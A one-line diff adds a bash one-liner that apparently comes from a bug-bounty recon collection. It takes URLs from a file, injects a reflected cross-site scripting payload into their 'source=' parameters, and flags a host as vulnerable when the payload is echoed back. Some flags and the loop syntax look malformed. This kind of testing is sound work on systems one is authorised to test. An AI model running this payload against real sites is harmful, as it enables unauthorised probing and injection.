@@ -1,0 +1,1 @@
+cat file.txt | gf xss | grep 'source='| qsreplace '".<script>confirm(1)</script>'| while read host do curl -silent -path-as-is -insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host Vulnerable"; done 
